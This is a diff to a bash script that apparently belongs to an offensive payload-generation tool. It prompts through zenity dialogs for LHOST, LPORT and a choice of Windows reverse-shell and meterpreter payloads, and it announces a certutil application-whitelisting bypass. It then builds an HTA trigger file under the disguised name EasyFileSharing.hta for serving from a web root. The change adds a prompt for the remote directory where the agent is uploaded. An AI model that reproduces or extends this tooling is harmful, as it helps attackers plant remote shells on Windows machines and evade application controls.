@@ -10007,10 +10007,16 @@ if [ "$?" -eq "0" ]; then
 echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
-N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1
 
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1
+# input payload name
+N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1
+# input payload remote upload directory
+D1r=$(zenity --title="☠ Enter remote upload dir ☠" --text "The remote directory where to upload agent\nexample: %tmp%" --entry --width 300) > /dev/null 2>&1
+
+
+
 
 
 echo "[☠] Loading certutil appl_whitelisting_bypass"
@@ -10129,19 +10135,23 @@ cat << !
 fi
 
 
-# build trigger.hta
+# build trigger.hta 
 cd $IPATH/templates
 echo "[☠] Building trigger.hta script .."
 sleep 2
 if [ "$chose" = "Build venom agent.bat" ]; then
   sed "s|IpAdR|$IP|" template.hta > trigger.hta
   sed -i "s/NoMe/$N4m/g" trigger.hta
+  sed -i "s/RdI/$D1r/g" trigger.hta
   mv trigger.hta $IPATH/output/EasyFileSharing.hta > /dev/null 2>&1
 else
   sed "s|IpAdR|$IP|" template_exe.hta > trigger.hta
   sed -i "s/NoMe/$N4m/g" trigger.hta
+  sed -i "s/RdI/$D1r/g" trigger.hta
   mv trigger.hta $IPATH/output/EasyFileSharing.hta > /dev/null 2>&1
 fi
+echo "[☠] Remote upload agent path sellected: $D1r"
+sleep 2
 #
 # copy all files to apache2 webroot ..
 #
